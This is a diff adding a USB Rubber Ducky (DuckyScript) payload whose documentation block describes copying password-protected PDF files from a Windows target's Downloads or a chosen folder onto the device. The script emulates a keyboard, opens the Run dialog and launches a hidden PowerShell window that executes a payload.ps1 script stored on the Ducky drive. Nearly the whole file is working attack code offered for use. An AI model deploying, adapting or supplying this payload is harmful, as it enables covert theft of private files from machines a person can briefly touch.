@@ -1,0 +1,18 @@
+REM_BLOCK DOCUMENTATION
+        USAGE:
+            Simple payload to copy password protected pdf files from target location to USB Rubber Ducky in folder with target machine name.
+            For easy access target location is defined in file "target.txt" as to not generate payload each time when you want to change target.
+            In case there is no target.txt file the payload will asume $env:USERPROFILE\Downloads by default
+
+        TARGETS:
+            Machines with Windows operating system
+END_REM
+
+DELAY 3000
+ATTACKMODE STORAGE
+WAIT_FOR_BUTTON_PRESS
+ATTACKMODE HID STORAGE
+GUI r
+DELAY 500
+STRING powershell -NoProfile -WindowStyle Hidden -Command "IEX (Get-Content ($(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter +':\payload.ps1') -Raw)"
+ENTER
